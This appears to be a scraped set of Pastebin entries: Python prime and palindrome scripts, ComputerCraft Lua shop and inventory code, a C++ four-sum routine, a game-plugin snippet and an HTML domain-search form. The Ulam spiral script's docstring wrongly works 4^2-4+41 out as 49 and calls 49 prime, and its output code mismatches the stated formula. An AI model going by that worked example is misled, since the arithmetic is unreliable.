- The equation used is [P = y^2 - y + 41].
- Prime numbers that are also palindromes will be highlighted in the output.
""""""

def is_prime(num):
    """"""
    Checks if a given number is prime.

    Args:
        num (int): The number to check for primality.

    Returns:
        bool: True if the number is prime, False otherwise.
    """"""
    if num < 2:
        return False
    for i in range(2, int(num**0.5) + 1):
        if num % i == 0:
            return False
    return True

def is_palindrome(num):
    """"""
    Checks if a given number is a palindrome.

    Args:
        num (int): The number to check for palindrome.

    Returns:
        bool: True if the number is a palindrome, False otherwise.
    """"""
    return str(num) == str(num)[::-1]

def generate_primes_and_palindromes(start_y, iterations):
    """"""
    Generates and identifies prime and palindromic prime numbers.

    Args:
        start_y (int): The starting value for 'y'.
        iterations (int): The number of iterations to check.

    Returns:
        list: A list of formatted strings representing the results.
    """"""
    results = []
    for y in range(start_y, start_y + iterations):
        P = y**2 - y + 41

        if is_prime(P) and is_palindrome(P):
            results.append(f""\033[31m[y={y}, pP={P}**]\033[0m"")
        elif is_prime(P):
            results.append(f""[y={y}, P={P}*]"")
        elif is_palindrome(P):
            results.append(f""\033[33m[y={y}, p={P}]\033[0m"")

    return results

def main():
    """"""
    Main function to execute the script.
    Takes user input for 'y' and iterations, then outputs the results to the terminal.
    """"""
    start_y = int(input(""Enter the starting value for y: ""))
    iterations = int(input(""Enter the number of iterations: ""))
    data = generate_primes_and_palindromes(start_y, iterations)

    print(""\nResults:"")
    for result in data:
        print(result)

if __name__ == ""__main__"":
    main()

"
4awc5nkM,inspect.lua - Main Turtle Inspect Program,HeyItzGeo,Lua,Sunday 10th of March 2024 10:03:54 PM CDT,"--Updated
local Item = peripheral.wrap(""front"")
local turtleID = os.getComputerID()


-- Set the shared location for update status
local updateStatusPath = ""disk/Updater/Files/update_status.txt""

-- Set the Pastebin code for your program
local pastebinCode = ""4awc5nkM""

-- Set the local path where you want to save the program
local localPath = ""startup""


-- Function to download content from Pastebin
function downloadFromPastebin(code)
    local url = ""https://pastebin.com/raw/"" .. code
    local response = http.get(url)
    
    if response then
        local content = response.readAll()
        response.close()
        return content
    else
        print(""Failed to download from Pastebin"")
        return nil
    end
end

-- Function to update the startup program
function updateStartup()
    if fs.exists(localPath) then
        fs.delete(localPath)
    end

    local content = downloadFromPastebin(pastebinCode)
    if content then
        local file = fs.open(localPath, ""w"")
        if file then
            file.write(content)
            file.close()
            print(""Startup program updated."")
        else
            print(""Failed to open file for writing: "" .. localPath)
        end
    else
        print(""Failed to update startup program."")
    end
end

-- Function to check for updates and update the program if needed
function checkForUpdates()
    if fs.exists(updateStatusPath) then
        local statusFile = fs.open(updateStatusPath, ""r"")
        if statusFile then
            local status = statusFile.readAll()
            statusFile.close()

            if status == ""update"" then
                updateStartup()

                -- Clear the status file after updating
                fs.delete(updateStatusPath)

                -- Terminate the current program to allow the new one to take effect
                os.queueEvent(""terminate"")
            end
        else
            print(""Failed to open update status file."")
        end
    end
end




-- Function to get item details
local function getItemDetails()
    local itemDetails = Item.getItemDetail(1)
    if itemDetails then
        return itemDetails.displayName, itemDetails.name
    end
    return nil, nil
end





-- Function to check if a file exists
local function fileExists(path)
    return fs.exists(path) and not fs.isDir(path)
end
-- Function to check if ""cost.txt"" is formatted correctly
local function checkCostFile()
    local costPath = ""cost.txt""
    if not fileExists(costPath) then
        print(""Error: Missing 'cost.txt'. Please create and format the file."")
        return false
    end
    local costFile = fs.open(costPath, ""r"")
    local countLine = costFile.readLine()
    local priceLine = costFile.readLine()
    costFile.close()
    if not countLine or not priceLine or not countLine:match(""Count = (%d+)"") or not priceLine:match(""Price = (%d+)"") then
        print(""Error: Incorrect format in 'cost.txt'. Please ensure it contains 'Count = <number>' and 'Price = <number>'."")
        return false
    end
    return true
end
-- Function to check if an item is in front
local function checkItemInFront()
    local DisplayName, ItemName = getItemDetails()
    if not DisplayName or not ItemName then
        print(""Error: No item detected in front. Please place an item in front of the turtle."")
        return false
    end
    return true
end
-- Main initialization
if not checkCostFile() or not checkItemInFront() then
    -- Handle initialization errors and exit the program if necessary
    return
end

-- Function to load the balance data from ShopBal.txt
local function loadBalances()
    local path = ""disk/ShopBal.txt""
    local file = fs.open(path, ""r"")
    if file then
        local content = file.readAll()
        file.close()
        local success, balances = pcall(textutils.unserialize, content)
        if success and type(balances) == ""table"" then
            return balances
        else
            print(""Error: Unable to unserialize balance data from "" .. path)
            print(""Error Message: "" .. tostring(balances))
        end
    else
        print(""Error: Unable to open file "" .. path)
    end
    return {}
end
-- Function to save the updated balances to ShopBal.txt
local function saveBalances(balances)
    local path = ""disk/ShopBal.txt""
    local file = fs.open(path, ""w"")
    if file then
        file.write(textutils.serialize(balances))
        file.close()
    else
        print(""Error: Unable to open file "" .. path)
    end
end
-- Function to save player items to a file with counts
local function savePlayerItems(username, displayName, itemName, count)
    local folderPath = ""disk/Players/""
    local filePath = folderPath .. username
    local file
    -- Create the folder if it doesn't exist
    if not fs.isDir(folderPath) then
        fs.makeDir(folderPath)
    end
    -- Open the file in append mode
    if fs.exists(filePath) then
        file = fs.open(filePath, ""r"")
        local content = file.readAll()
        file.close()
        -- Parse existing content to update item counts
        local playerItems = {}
        for line in content:gmatch(""[^\r\n]+"") do
            local itemDisplayName, itemNameExisting, existingCount = line:match(""([^,]+),([^,]+),(%d+)"")
            if itemDisplayName and itemNameExisting and existingCount then
                existingCount = tonumber(existingCount)
                playerItems[itemDisplayName .. "","" .. itemNameExisting] = existingCount
            end
        end
        -- If the item doesn't exist in the file, add a new line
        if not playerItems[displayName .. "","" .. itemName] then
            playerItems[displayName .. "","" .. itemName] = 0
        end
        -- Update the count based on the specified count
        playerItems[displayName .. "","" .. itemName] = playerItems[displayName .. "","" .. itemName] + count
        file = fs.open(filePath, ""w"")
        for key, value in pairs(playerItems) do
            file.writeLine(key .. "","" .. value)
        end
        file.close()
    else
        -- Open the file in write mode with count for the first occurrence
        file = fs.open(filePath, ""w"")
        if file then
            file.writeLine(displayName .. "","" .. itemName .. "","" .. count)
            file.close()
        else
            print(""Error: Unable to open file "" .. filePath)
        end
    end
end
-- Function to handle successful money transaction
local function Money_Success(username, cost, balances)
    print(""Transaction successful for "" .. username .. "". Cost: "" .. cost)
    balances[username] = balances[username] - cost
    saveBalances(balances)
    local DisplayName, ItemName = getItemDetails()
    -- Assuming 'cost.txt' contains individual count and price lines
    local costPath = ""cost.txt""
    local costFile = fs.open(costPath, ""r"")
    if costFile then
        local countLine = costFile.readLine()
        local priceLine = costFile.readLine()
        local count = tonumber(countLine:match(""Count = (%d+)""))
        local price = tonumber(priceLine:match(""Price = (%d+)""))
        if count and price then
            local cost = price  -- Cost per item, not total cost
            savePlayerItems(username, DisplayName, ItemName, count)  -- Pass the count as the fourth parameter
        else
            print(""Error: Unable to read count and price from "" .. costPath)
        end
        costFile.close()
    else
        print(""Error: Unable to open file "" .. costPath)
    end
    -- Add your code for a successful transaction here
end
-- Function to handle failed money transaction
local function Money_Fail(username, cost, currentBalance)
    print(""Transaction failed for "" .. username .. "". Insufficient funds. Cost: "" .. cost)
    print(""Current Balance for "" .. username .. "": "" .. currentBalance)
    -- Add your code for a failed transaction here
end
-- Function to compare the balance and perform actions accordingly
local function checkBalance(username, cost)
    local balances = loadBalances()
    if balances[username] then
        local playerBalance = balances[username]
        if playerBalance >= cost then
            Money_Success(username, cost, balances)
        else
            Money_Fail(username, cost, playerBalance)
        end
    else
        Money_Fail(username, cost, 0)  -- Assuming initial balance is 0
    end
end
-- Function to update the global database
local function updateGlobalDatabase(DisplayName, Price, Count, TurtleID)
    local path = ""disk/GlobalDatabase.txt""
    local file
    -- Extract the item name without the ""minecraft:"" prefix
    local itemName = DisplayName:gsub(""minecraft:"", """")
    if fs.exists(path) then
        file = fs.open(path, ""r"")
        local content = file.readAll()
        file.close()
        -- Parse existing content to find and update the line for the current TurtleID
        local lines = {}
        local foundTurtleID = false
        for line in content:gmatch(""[^\r\n]+"") do
            local itemNameExisting, priceExisting, countExisting, turtleIDExisting = line:match(""([^|]+)|([^|]+)|([^|]+)|([^|]+)"")
            if itemNameExisting and priceExisting and countExisting and turtleIDExisting then
                if tonumber(turtleIDExisting) == TurtleID then
                    foundTurtleID = true
                    line = itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID
                end
                table.insert(lines, line)
            end
        end
        -- If the TurtleID was not found, append a new line
        if not foundTurtleID then
            table.insert(lines, itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID)
        end
        file = fs.open(path, ""w"")
        for _, line in ipairs(lines) do
            file.writeLine(line)
        end
        file.close()
    else
        -- Create the file and add a new line for the current TurtleID
        file = fs.open(path, ""w"")
        if file then
            file.writeLine(itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID)
            file.close()
        else
            print(""Error: Unable to open file "" .. path)
        end
    end
end
-- Function to update cost.txt with values associated with TurtleID
local function updateCostFile(TurtleID)
    local turtleCostsPath = ""cost.txt""
    local globalDatabasePath = ""disk/GlobalDatabase.txt""
    local file
    local foundTurtleID = false
    local count, price
    -- Check if TurtleID is in globaldatabase.txt
    if fs.exists(globalDatabasePath) then
        file = fs.open(globalDatabasePath, ""r"")
        local content = file.readAll()
        file.close()
        -- Check if TurtleID entry exists in globaldatabase.txt
        if content:match(TurtleID) then
            -- Extract values for the TurtleID from globaldatabase.txt
            local itemName, priceExisting, countExisting = content:match(""([^|]+)|([^|]+)|([^|]+)|"" .. TurtleID)
            if itemName and priceExisting and countExisting then
                foundTurtleID = true
                price = tonumber(priceExisting)
                count = tonumber(countExisting)
            end
        end
    else
        print(""Error: Unable to open file "" .. globalDatabasePath)
        return
    end
    -- Set values in cost.txt based on globaldatabase.txt
    if foundTurtleID then
        file = fs.open(turtleCostsPath, ""w"")
        file.writeLine(""Count = "" .. count)
        file.writeLine(""Price = "" .. price)
        file.close()
       --#IGNORE print(""Updated cost.txt with values from GlobalDatabase.txt for TurtleID "" .. TurtleID)
    else
        -- Add a new entry for the TurtleID with values from cost.txt to globaldatabase.txt
        if fs.exists(turtleCostsPath) then
            file = fs.open(turtleCostsPath, ""r"")
            local countLine = file.readLine()
            local priceLine = file.readLine()
            file.close()
            local itemName = DisplayName  -- Use the actual item display name
			if itemName then
				print(""Item Name Found"")
			else
				print(""Error: itemName is nil. Unable to update globalDatabase.txt."")
				-- Add any additional handling or error reporting as needed
			end
            file = fs.open(globalDatabasePath, ""a"")
			local formattedItemName = getItemDetails() or ItemName:gsub(""minecraft:"", """")
			file.writeLine(formattedItemName .. ""|"" .. priceLine:gsub(""Price = "", """") .. ""|"" .. countLine:gsub(""Count = "", """") .. ""|"" .. TurtleID)
            --file.writeLine(itemName .. ""|"" .. priceLine:gsub(""Price = "", """") .. ""|"" .. countLine:gsub(""Count = "", """") .. ""|"" .. TurtleID)
            file.close()
            print(""Added new entry for TurtleID "" .. TurtleID .. "" in GlobalDatabase.txt with values from cost.txt"")
        else
            print(""Error: Unable to open file "" .. turtleCostsPath)
        end
    end
end
-- Main loop to constantly check for player clicks
local prevItemName = nil  -- Variable to store the previous item name
while true do
	
	-- Check for inactivity and restart if needed
    event, username, device = os.pullEvent(""playerClick"")
	checkForUpdates()
    -- Get item details when a player clicks
    local DisplayName, ItemName = getItemDetails()
    -- Check if item details are available
    if DisplayName and ItemName then
		print(""DisplayName: "" .. DisplayName)
		print(""ItemName: "" .. ItemName)
        local TurtleID = os.getComputerID()
        -- Update cost.txt with values associated with the TurtleID
        updateCostFile(TurtleID)
        -- Check if the item in front has changed
        if prevItemName ~= ItemName then
            prevItemName = ItemName
            -- Assuming 'cost.txt' contains individual count and price lines
            local costPath = ""cost.txt""
            local costFile = fs.open(costPath, ""r"")
            if costFile then
                local countLine = costFile.readLine()
                local priceLine = costFile.readLine()
                if countLine and priceLine then
                    local count = tonumber(countLine:match(""Count = (%d+)""))
                    local price = tonumber(priceLine:match(""Price = (%d+)""))
                    if count and price then
                        local cost = price  -- Cost per item, not total cost
                        checkBalance(username, cost)
                        -- Remove ""minecraft:"" from ItemName
                        local formattedItemName = ItemName:gsub(""minecraft:"", """")
                        -- Update the item name in globalDatabase.txt
                        local globalDatabasePath = ""disk/GlobalDatabase.txt""
                        local globalFile = fs.open(globalDatabasePath, ""r"")
                        local globalContent = globalFile.readAll()
                        globalFile.close()
                        local lines = {}
                        for line in globalContent:gmatch(""[^\r\n]+"") do
                            local itemNameExisting, priceExisting, countExisting, turtleIDExisting = line:match(""([^|]+)|([^|]+)|([^|]+)|([^|]+)"")
                            if itemNameExisting and priceExisting and countExisting and turtleIDExisting then
                                if tonumber(turtleIDExisting) == TurtleID then
                                    -- Update the item name
                                    line = formattedItemName .. ""|"" .. priceExisting .. ""|"" .. countExisting .. ""|"" .. turtleIDExisting
                                end
                            end
                            table.insert(lines, line)
                        end
                        globalFile = fs.open(globalDatabasePath, ""w"")
                        for _, line in ipairs(lines) do
                            globalFile.writeLine(line)
                        end
                        globalFile.close()
                        -- Add any additional code specific to your application
                    else
                        print(""Error: Unable to read count and price from "" .. costPath)
                    end
                else
                    print(""Error: Missing lines in "" .. costPath)
                end
                costFile.close()
                -- Reset prevItemName to nil after a successful transaction
                prevItemName = nil
            else
                print(""Error: Unable to open file "" .. costPath)
            end
        else
            print(""Item in front has not changed. Skipping update."")
        end
    end
end"
h34Uemxn,Untitled,ShRooK_MoHameD,C++,Sunday 10th of March 2024 10:01:00 PM CDT,"void solve(){

   ll n , x ; cin >> n >> x;
   vector < ll > v(n); cin(v);
   map < ll , vector <int>> mp;
   for (int i = 0; i < n; i++)
   {
      mp[v[i]].push_back(i + 1);
   }
   
   sort(all(v));

   for (int i = 0; i < n - 3; i++)
   {
       
       for (int j = i + 1 ; j < n - 2; j++)
       {
            int l = j + 1 , r = n-1; 
    
            while (r > l) 
            { 
                if ( v[i] + v[j] + v[l] + v[r] == x) 
                { 
                    cout << mp[v[i]].back() << "" "" ; mp[v[i]].pop_back();
                    cout << mp[v[j]].back() << "" "" ; mp[v[j]].pop_back();
                    cout <<  mp[v[l]].back() << "" ""; mp[v[l]].pop_back();
                    cout <<  mp[v[r]].back(); 
                    return;
                } 
            
                if (v[i] + v[j] + v[l] + v[r] > x) 
                    r--; 
                else  
                    l++; 
            } 
       }
       
   }
   
   cout << ""IMPOSSIBLE"";
   
}"
4ADsAdAf,preset,CustomRL,C++,Sunday 10th of March 2024 09:56:13 PM CDT,"auto itemWrapper = gameWrapper->GetItemsWrapper();
auto presetLoadout = gameWrapper->GetUserLoadoutSave().GetPresets();
// auto loopAmount = presetLoadout.Count();
auto loopAmount = 1;

if (!itemWrapper) return;

for (size_t i = 0; i < loopAmount; i++) {
	auto preset = presetLoadout.Get(i);
	auto loadout = gameWrapper->GetUserLoadoutSave().GetEquippedLoadout().GetLoadoutData().blue.GetOnlineLoadoutV2(); // temp for just testing current preset

	for (const auto& itemID : loadout) {
		ItemsWrapper item = gameWrapper->GetItemsWrapper(); 
		if (item.IsNull()) continue;

		auto product = item.GetProduct(itemID.lower_bits);

		if (!product.IsNull()) {
			auto quality = product.GetDisplayLabelSlot().ToString();
			cvarManager->log(""\nLong Label: "" + product.GetLongLabel().ToString() + ""\nQuality: "" + quality);
		}
	}
}"
9RWygwzz,Untitled,lgrocks11,Lua,Sunday 10th of March 2024 09:54:06 PM CDT,"--Variables

local Connected_Inventories = {}
local Inventory = {}
local Slot_Count = 16

--Functions

local function readInventory(InventoryIndex,InventoryID)
	--make a list of every item,its count,and slot number.
	local ItemInfo_List = {}
	for i = 1,Slot_Count do
		local ItemInfo = turtle.getItemDetail(i)
		if ItemInfo then
			local Item_Info = {ItemInfo[1],ItemInfo[2],i}
			table.insert(ItemInfo_List,Item_Info)
		end
	end
	return ItemInfo_List
end

local function addItemToInvList(ItemInfos)
	--Add item and count to the general Inventory list.
	table.insert(Inventory,ItemInfos)
end

local function moveInfo(Inventory_List)
	for Item_Index,Item_Information in pairs(Inventory_List) do
		addItemToInvList(Item_Information)
	end
end

local function takeInventory()
	for Inventory_Index,Inventory_ID in pairs(Connected_Inventories) do
		local InvList = readInventory(Inventory_Index,Inventory_ID)
		--for every item in the readInventory lists, add its name and its count to the general Inventory list.
		moveInfo(InvList)
	end
	return Inventory
end

local function printInventory()
	takeInventory()
	print(""Inventory: "")
	for ItemIndex,ItemInformation in pairs(Inventory) do
		print(ItemInformation[1].."";""..ItemInformation[2])
	end
end

--Program starts

for Peripheral_Index,Peripheral_ID in pairs(peripheral.getNames()) do
	local Current_Peripheral = peripheral.wrap(Peripheral_ID)
	local Peripheral_Name,Peripheral_Type = peripheral.getType(Current_Peripheral)
	if Peripheral_Type == ""inventory"" then
		table.insert(Connected_Inventories,Current_Peripheral)
	end
end

printInventory()"
ELGQtBfK,Untitled,lgrocks11,Lua,Sunday 10th of March 2024 09:50:06 PM CDT,"--Variables

local Connected_Inventories = {}
local Inventory = {}
local Slot_Count = 16

--Functions

local function readInventory(InventoryIndex,InventoryID)
	--make a list of every item,its count,and slot number.
	local ItemInfo_List = {}
	for i = 1,Slot_Count do
		local ItemInfo = turtle.getItemDetail(i)
		if ItemInfo then
			local Item_Info = {ItemInfo[1],ItemInfo[2],i}
			table.insert(ItemInfo_List,Item_Info)
		end
	end
	return ItemInfo_List
end

local function addItemToInvList(ItemInfos)
	--Add item and count to the general Inventory list.
	table.insert(Inventory,ItemInfos)
end

local function moveInfo(Inventory_List)
	for Item_Index,Item_Information in pairs(Inventory_List) do
		addItemToInvList(Item_Information)
	end
end

local function takeInventory()
	for Inventory_Index,Inventory_ID in pairs(Connected_Inventories) do
		local InvList = readInventory(Inventory_Index,Inventory_ID)
		--for every item in the readInventory lists, add its name and its count to the general Inventory list.
		moveInfo(InvList)
	end
	return Inventory
end

local function printInventory()
	takeInventory()
	for ItemIndex,ItemInformation in pairs(Inventory) do
		print(ItemInformation[1].."";""..ItemInformation[2])
	end
end

--Program starts

for Peripheral_Index,Peripheral_ID in pairs(peripheral.getNames()) do
	local Current_Peripheral = peripheral.wrap(Peripheral_ID)
	local Peripheral_Name,Peripheral_Type = peripheral.getType(Current_Peripheral)
	if Peripheral_Type == ""inventory"" then
		table.insert(Connected_Inventories,Current_Peripheral)
	end
end

printInventory()"
w2UgEkNb,Ticket 15367488 - custom HTML block,longnguyenwp,HTML,Sunday 10th of March 2024 09:42:03 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
<meta charset=""UTF-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<title>Domain Search.</title>
<style>
    /* Container for the form to center align it */
    .form-container {
        text-align: center;
        margin-top: 20px;

    }

    /* Style for the form */
    form {
        display: inline-block; /* Align input and button in a line */
        background-color: transparent; /* No background for the form */
        border: none; /* No border for the form */
    }

    /* Style for the input field */
    input[type=""text""] {
        height: 44px; /* Height of input field */
        width: 300px; /* Adjust this value to change the length */
        padding: 0 10px; /* Padding inside the input field */
        border: 2px solid #F0C05A; /* Specified border color */
        background-color: black; /* Background color for the input field */
        color: white; /* Text color inside the input field */
        border-right: none; /* Remove right border to connect with the button */
        border-radius: 22px 0 0 22px; /* Rounded corners on the left side */
    }

    /* Style for the submit button */
    input[type=""submit""] {
        height: 44px; /* Slightly larger to cover the border of the input field */
        border: 2px solid #F0C05A; /* Specified border color */
        background-color: #F0C05A; /* Background color for the button */
        color: black; /* Text color for the button */
        padding: 0 15px; /* Padding inside the button */
        border-radius: 0 22px 22px 0; /* Rounded corners on the right side */
        cursor: pointer; /* Change cursor to pointer to indicate clickable item */
        border-left: none; /* Remove left border to eliminate gap with the input field */
        font-size: 18px; /* Adjust this value to change the font size */
        font-weight: bold; /* Make the text bold */
    }

    /* Hover effect for button */
    input[type=""submit""]:hover {
        background-color: #DAA520; /* Darker shade on hover for better user interaction */
        border-color: #DAA520; /* Match border color with the background on hover */
    }

    /* Style for placeholder to ensure it's white */
    input[type=""text""]::placeholder {
        color: white;
        font-size: 18px; /* Adjust this value to change the font size */
        font-weight: bold; /* Make the text bold */
    }

</style>
</head>
<body>

<div class=""form-container"">
    <form action=""https://shop.cybermerlin.com/cart.php?a=add&domain=register"" method=""post"">
        <input type=""text"" name=""query"" placeholder="" Find your new domain name"" />
        <input type=""submit"" value=""Check"" />
    </form>
</div>

</body>
</html>"
EgRGwNGQ,ulam_py2y41,Python253,Python,Sunday 10th of March 2024 09:23:39 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: ulam_py2y41.py
# Version: 2.0.1
# Author: Jeoi Reqi

""""""
Ulam Spiral Visualizer Of Primes & Palindromic Primes On The Golden Line:

This Python script generates a spiral visualization of primes and palindromic primes.
The Ulam Spiral is a spiral arrangement of natural numbers, where the numbers are plotted on a grid & primes are highlighted.
In this script, the golden line is traced by the equation [P = y^2 - y + 41], where 'y' is the starting value determined by the user.
The golden line represents a diagonal line crossing the center where 'y' is.
Primes (indicated by red dots) & Palindromic Primes (indicated by blue dots) are distinctly marked, with some Primes being Palindromic Primes.

Requirements:
- Python 3
- Matplotlib

Usage:
- Run the script in a terminal or command prompt.
- Enter the starting value for 'y', which determines the plot's central starting point value.
- Enter the number of iterations of 'y' to be visualized in the spiral grid.
- The script will generate a plot and save it as a PNG file (e.g., 'y41_i100.png').
- The terminal output will be saved in a dynamically named text file (e.g., 'output_y41_i100.txt').

Note:
- The golden line is traced by the equation [P = y^2 - y + 41].
- Close the plot window to terminate the script.

Equation:   P=y^2-y+41
 
 Definition:
        Must be TRUE:
            [P] is a Prime 
            [P] is possibly a Palindrome
            [y] is a natural whole integer
            [y] is a positive number
      !!    [y] is not less than 2  (y>2)        
        (Note: P = Prime Pattern Breaks if y>2)
        
        
        Example: (if y = 4) Find P:
            
            [P = y^2-y+41]

            4^2-4+41 = P
            4x4-4+37 = P
            16-4 +37 = P
            12 + 37 = 49
 
            Prime Value is equal to (4 squared minus 4 plus 41) 
            P = 49 (Prime)
""""""

# Imports
import matplotlib.pyplot as plt
import time
import sys
import os

# Create an empty list to capture terminal output
terminal_output = []

plt.style.use('dark_background')
plt.ion()

# checks if a given number is prime or not
def is_prime(num):
    if num < 2:
        return False
    for i in range(2, int(num**0.5) + 1):
        if num % i == 0:
            return False
    return True

# change the x/y coordinates based on the state
def march(state, x, y):
    if state == 0:
        x += 1
    if state == 1:
        y += 1
    if state == 2:
        x -= 1
    if state == 3:
        y -= 1

    return x, y

# Create a list to capture the terminal output
terminal_output = []

# Ask the user for the starting number
y_value = int(input(""Enter the starting number (y): ""))

while y_value < 2:
    # If the user enters a starting number less than 2, prompt them to enter a valid one
    print(""Please enter a starting number greater than or equal to 2."")
    y_value = int(input(""Enter the starting number (y): ""))

# Ask the user for the number of iterations
iterations_number = int(input(""Enter the number of iterations (i): ""))

# Initialize variables for the previous coordinates
l_x = 1
l_y = 0

# Initialize current coordinates based on user input
x = 0
y = y_value  # Use the user's input as the starting number

# Initialize variables for the Ulam Spiral algorithm
state = -1
factor = -1
steps = 1
current_steps = 0

# Record the start time for performance measurement
start_time = time.time()

# Create a list to store plot data
plot_data = []

# Create a dynamic filename for the plot
plot_filename = f""y{y_value}_i{iterations_number}.png""

# Create a single plot
fig, ax = plt.subplots()

# Loop through the range of iterations to generate points for the Ulam Spiral
for i in range(y_value, y_value + iterations_number):
    # Store the current coordinates as the previous coordinates
    l_x = x
    l_y = y

    # Increment the steps taken in the current direction
    current_steps += 1

    # Check if the current steps have reached the predefined number of steps
    if current_steps >= steps:
        # Increase the factor to change the direction of movement
        factor += 1
        current_steps = 0

        # Move to the next coordinates based on the Ulam Spiral algorithm
        x, y = march(state, x, y)

        # Increase the state to change the direction of movement
        state += 1

        # Reset the state to 0 if it exceeds 3 (four directions in total)
        if state > 3:
            state = 0

        # Change the factor after every two steps
        if factor == 2:
            factor = 0
            steps += 1

    # If the current steps are not 0, move to the next coordinates
    if current_steps != 0:
        x, y = march(state, x, y)

    # Define the two points to be plotted
    point1 = [x, y]
    point2 = [l_x, l_y]

    # Define the x and y values for plotting
    x_values = [point1[0], point2[0]]
    y_values = [point1[1], point2[1]]

    # Plot the line connecting the two points with a yellow color and reduced opacity
    ax.plot(x_values, y_values, 'y-', alpha=0.25)

    # Check if the current number in the iteration is a prime number
    if is_prime(i):
        # Check if the prime number is also a palindromic prime with at least two digits
        if str(i) == str(i)[::-1] and len(str(i)) >= 2:
            # Plot the point in blue if it is a palindromic prime
            ax.plot(x, y, 'bo')
            
            # Annotate the point with the palindromic prime number
            ax.annotate(i, (x, y), color='white', fontsize=8, ha='center', va='center')
        else:
            # Plot the point in red if it is a prime but not a palindromic prime
            ax.plot(x, y, 'ro')

    # Append the current iteration data to the plot_data list
    plot_data.append((i, x, y))


    # Set the dynamic title for the plot
    ax.set_title(f""y{y_value}_i{iterations_number}"")

    # Remove ticks from the plot
    ax.set_xticks([])
    ax.set_yticks([])

    #plt.pause(0.001)  # Pause for a short duration to allow plotting if needed

    # Allow user early termination: Check if any figures are open, break the loop if not
    if not plt.get_fignums():
        print(""Plotting terminated by user."")
        break

# Automatically save the image with a dynamic filename
plt.savefig(plot_filename)

# Close the figure to prevent issues with plt.show()
plt.close()

end_time = time.time()
elapsed_time = end_time - start_time
        
# Save the terminal output to a text file with a dynamic filename
output_filename = f""output_{plot_filename.replace('.png', '.txt')}""
with open(output_filename, ""w"") as file:
    # Write the starting value for 'y' and the number of iterations to the file
    file.write(f""value for y: {y_value}\n"")
    file.write(f""Enter the number of iterations: {iterations_number}\n"")
    file.write(""\nResults:\n"")
    
    # Iterate through the plot data to generate output for each iteration
    for data in plot_data:
        y_value, x_value, _ = data
        P = x_value**2 - x_value + y_value

        # Check if the calculated value (P) is a prime number
        if is_prime(P):
            # Check if the prime number is also a palindromic prime
            if is_prime(P) and str(P) == str(P)[::-1]:
                # Write the output for palindromic primes
                result_str = f""[y={y_value}, P={P}]   --   [PALINDROMIC PRIME]""
            else:
                # Write the output for non-palindromic primes
                result_str = f""[y={y_value}, P={P}]""
            
            # Write the result string to the file
            file.write(result_str + ""\n"")


# Terminal Output Messages
print(f""\nPlot data saved to 'plot_data.txt'\n"")
print(f""\nTerminal output saved to {output_filename}\n"")
print(f""\nTime elapsed: {elapsed_time} seconds\n"")

"
bqS26FXD,Untitled,lgrocks11,Lua,Sunday 10th of March 2024 09:19:57 PM CDT,"--Variables

local Connected_Inventories = {}
local Inventory = {}
local Slot_Count = 16

--Functions

local function readInventory(InventoryIndex,InventoryID)
	--make a list of every item,its count,and slot number.
	local ItemInfo_List = {}
	for i = 1,Slot_Count do
		local ItemInfo = turtle.getItemDetail(i)
		local Item_Info = {ItemInfo[1],ItemInfo[2],i}
		table.insert(ItemInfo_List,Item_Info)
	end
	return ItemInfo_List
end

local function addItemToInvList(ItemInfos)
	--Add item and count to the general Inventory list.
	table.insert(Inventory,ItemInfos)
end

local function moveInfo(Inventory_List)
	for Item_Index,Item_Information in pairs(Inventory_List) do
		addItemToInvList(Item_Information)
	end
end

local function takeInventory()
	for Inventory_Index,Inventory_ID in pairs(Connected_Inventories) do
		local InvList = readInventory(Inventory_Index,Inventory_ID)
		--for every item in the readInventory lists, add its name and its count to the general Inventory list.
		moveInfo(InvList)
	end
	return Inventory
end

local function printInventory()
	takeInventory()
	for ItemIndex,ItemInformation in pairs(Inventory) do
		print(ItemInformation[1].."";""..ItemInformation[2])
	end
end

--Program starts

for Peripheral_Index,Peripheral_ID in pairs(peripherals.getNames()) do
	local Current_Peripheral = perpheral.wrap(Peripheral_ID)
	local Peripheral_Name,Peripheral_Type = peripheral.getType(Current_Peripheral)
	if Peripheral_Type == ""inventory"" then
		table.insert(Connected_Inventories,Current_Peripheral)
	end
end

printInventory()"
zbqBu8sU,inspect.lua,HeyItzGeo,Lua,Sunday 10th of March 2024 09:10:28 PM CDT,"local Item = peripheral.wrap(""front"")







local turtleID = os.getComputerID()



























-- Function to get item details







local function getItemDetails()







    local itemDetails = Item.getItemDetail(1)







    if itemDetails then







        return itemDetails.displayName, itemDetails.name







    end







    return nil, nil







end















































-- Function to load the balance data from ShopBal.txt















local function loadBalances()















    local path = ""disk/ShopBal.txt""















    local file = fs.open(path, ""r"")































    if file then















        local content = file.readAll()















        file.close()































        local success, balances = pcall(textutils.unserialize, content)































        if success and type(balances) == ""table"" then















            return balances















        else















            print(""Error: Unable to unserialize balance data from "" .. path)















            print(""Error Message: "" .. tostring(balances))















        end















    else















        print(""Error: Unable to open file "" .. path)















    end































    return {}















end































-- Function to save the updated balances to ShopBal.txt















local function saveBalances(balances)















    local path = ""disk/ShopBal.txt""















    local file = fs.open(path, ""w"")































    if file then















        file.write(textutils.serialize(balances))















        file.close()















    else















        print(""Error: Unable to open file "" .. path)















    end















end































-- Function to save player items to a file with counts















local function savePlayerItems(username, displayName, itemName, count)















    local folderPath = ""disk/Players/""















    local filePath = folderPath .. username















    local file































    -- Create the folder if it doesn't exist















    if not fs.isDir(folderPath) then















        fs.makeDir(folderPath)















    end































    -- Open the file in append mode















    if fs.exists(filePath) then















        file = fs.open(filePath, ""r"")















        local content = file.readAll()















        file.close()































        -- Parse existing content to update item counts















        local playerItems = {}































        for line in content:gmatch(""[^\r\n]+"") do















            local itemDisplayName, itemNameExisting, existingCount = line:match(""([^,]+),([^,]+),(%d+)"")















            if itemDisplayName and itemNameExisting and existingCount then















                existingCount = tonumber(existingCount)















                playerItems[itemDisplayName .. "","" .. itemNameExisting] = existingCount















            end















        end































        -- If the item doesn't exist in the file, add a new line















        if not playerItems[displayName .. "","" .. itemName] then















            playerItems[displayName .. "","" .. itemName] = 0















        end































        -- Update the count based on the specified count















        playerItems[displayName .. "","" .. itemName] = playerItems[displayName .. "","" .. itemName] + count































        file = fs.open(filePath, ""w"")















        for key, value in pairs(playerItems) do















            file.writeLine(key .. "","" .. value)















        end















